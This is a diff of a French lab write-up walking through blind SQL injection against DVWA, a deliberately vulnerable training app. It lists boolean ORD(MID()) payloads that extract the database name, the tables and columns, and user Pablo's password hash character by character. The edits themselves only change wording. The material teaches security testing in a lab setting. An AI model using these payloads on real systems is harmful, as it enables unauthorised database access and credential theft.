@@ -1,22 +1,22 @@
 # Niveau "Low"
 
-Une injection à l'aveugle diffère d'une injection plus classique par le fait que l'application va répondre à nos requêtes seulement par oui ou par non.
+Une injection à l'aveugle diffère d'une injection plus classique par le fait que l'application va répondre à mes requêtes seulement par oui ou par non.
 
-Par exemple, l'application nous répond que l'`id` renseigné est bel et bien présent dans la base \(soit une réponse oui\) :
+Par exemple, l'application répond que l'`id` renseigné est bel et bien présent dans la base (soit une réponse oui) :
 
 ![](../../../../.gitbook/assets/bd92deecf1f42e9bfdbee0dfcd09a3ea.png)
 
-Dans le cas contraire, l'application répond par un message spécifique \(sur d'autres applications il peut s'agir de l'absence de message\) indiquant que l'`id` est inexistant \(réponse non\) :
+Dans le cas contraire, l'application répond par un message spécifique (sur d'autres applications il peut s'agir de l'absence de message) indiquant que l'`id` est inexistant (réponse non) :
 
 ![](../../../../.gitbook/assets/105eeb5ddcd08b5c038a4cb90ea21f40.png)
 
-Comprenant maintenant un peu mieux le principe de l'injection à l'aveugle, il nous reste plus qu'à identifier et exploiter l'injection.
+Comprenant maintenant un peu mieux le principe de l'injection à l'aveugle, il me reste plus qu'à identifier et exploiter l'injection.
 
-L'injection du caractère spécial `"'"` ne déclenche pas d'erreur, il nous faut alors trouver une autre manière de confirmer la présence d'une faille SQL :
+L'injection du caractère spécial `"'"` ne déclenche pas d'erreur, il me faut alors trouver une autre manière de confirmer la présence d'une faille SQL :
 
 ![](../../../../.gitbook/assets/36e615b1ddf5aed704bcef8c75cbb216.png)
 
-Il existe plein de possibilités pour cela, en voici une. Nous savons que l'`id` `"1"` existe, nous allons donc tenter de modifier la requête afin d'ajouter une clause `AND` :
+Il existe plein de possibilités pour cela, en voici une. Je sais que l'`id` `"1"` existe, je vais donc tenter de modifier la requête afin d'ajouter une clause `AND` :
 
 ![](../../../../.gitbook/assets/079ff9c143393da1eb378be8a82531bd.png)
 
@@ -26,7 +26,7 @@ La réponse négative n'indique pas la présence d'injection SQL à elle-seule, 
 
 Révèle bien l’existence de la vulnérabilité.
 
-La première étape est de récupérer le nom de la base de données utilisée par l'application. Pour rappel, l'application ne peut répondre seulement que par oui ou par non, nous allons donc gentiment demander à l'application si la première lettre du nom de la base commence par `"a"`, par `"b"`, par `"c"` etc ... \(j'ai ajouté le premier `"'"` seulement pour la coloration syntaxique\) :
+La première étape est de récupérer le nom de la base de données utilisée par l'application. Pour rappel, l'application ne peut répondre seulement que par oui ou par non, je vais donc gentiment demander à l'application si la première lettre du nom de la base commence par `"a"`, par `"b"`, par `"c"` etc ... (j'ai ajouté le premier `"'"` seulement pour la coloration syntaxique) :
 
 ```sql
 '1' AND ORD(MID(DATABASE(),1,1)) = 100 -- 
@@ -36,7 +36,7 @@ La première étape est de récupérer le nom de la base de données utilisée p
 
 _Explications_
 
-Ici, nous demandons à l'application si la première lettre du nom de sa base de données est `"d"` \(`100` en décimal\). L'application nous répond par l'affirmative.
+Ici, je demande à l'application si la première lettre du nom de sa base de données est `"d"` (`100` en décimal). L'application me répond par l'affirmative.
 
 * `DATABASE()` : renvoie la chaîne "dvwa"
 * `MID(DATABASE(),1,1)` : renvoie le première caractère de la chaîne retournée par `DATABASE()`
@@ -55,11 +55,11 @@ Soit pour la chaîne entière :
 '1' AND ORD(MID(DATABASE(),4,1)) = 97 --    // a
 ```
 
-De plus, il est également possible de déterminer tout d'abord la longueur de la chaîne renvoyée par la fonction appelée \(ici `DATABASE()`\) :
+De plus, il est également possible de déterminer tout d'abord la longueur de la chaîne renvoyée par la fonction appelée (ici `DATABASE()`) :
 
 ![](../../../../.gitbook/assets/08551d416e3b89c75f132839073a942e.png)
 
-On continue avec la récupération des noms des tables de cette base. Etant en aveugle, on récupère en premier lieu, le nombre de tables existants dans la base \(`50` représentant `"2"` en décimal\) :
+Je continue avec la récupération des noms des tables de cette base. Etant en aveugle, je récupère en premier lieu, le nombre de tables existants dans la base (`50` représentant `"2"` en décimal) :
 
 ![](../../../../.gitbook/assets/243bd89dd43b2063f7372d4deab836cb.png)
 
@@ -85,7 +85,7 @@ Puis les noms des deux tables :
 '1' AND ORD(MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dvwa' LIMIT 1,2),5,1)) = 115 --  // s
 ```
 
-On détermine ensuite le nombre de colonnes de la table `users` , soit ici 8 \(`56` en décimal\) : 
+Je détermine ensuite le nombre de colonnes de la table `users` , soit ici 8 (`56` en décimal) :&#x20;
 
 ```sql
 '1' AND ORD(MID((SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' AND table_schema='dvwa'),1,1)) = 56 -- 
@@ -93,7 +93,7 @@ On détermine ensuite le nombre de colonnes de la table `users` , soit ici 8 \(`
 
 ![](../../../../.gitbook/assets/cb2d037474143c3255e745e0928d9279.png)
 
-Puis on retrouve les noms des colonnes \(ici en exemple `user` et `password`\) :
+Puis je retrouve les noms des colonnes (ici en exemple `user` et `password`) :
 
 ```sql
 '1' AND ORD(MID((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' AND table_schema='dvwa' LIMIT 3,1),1,1)) = 117 --  // u 
@@ -113,7 +113,7 @@ Puis on retrouve les noms des colonnes \(ici en exemple `user` et `password`\) :
 '1' AND ORD(MID((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' AND table_schema='dvwa' LIMIT 4,1),8,1)) = 100 --  // d
 ```
 
-Finalement, l'empreinte du mot de passe de notre victime \(ici Pablo\) :
+Finalement, l'empreinte du mot de passe de notre victime (ici Pablo) :
 
 ```sql
 '1' AND ORD(MID((SELECT password FROM dvwa.users WHERE user='Pablo'),1,1)) = 48 --   // 0  
@@ -157,4 +157,3 @@ Soit :
 {% hint style="info" %}
 On se concentre ici seulement sur l'utilisateur Pablo mais il est bien sur possible de récupérer tous les noms des utilisateurs ainsi que les mots de passe associés en utilisant la même technique
 {% endhint %}
-
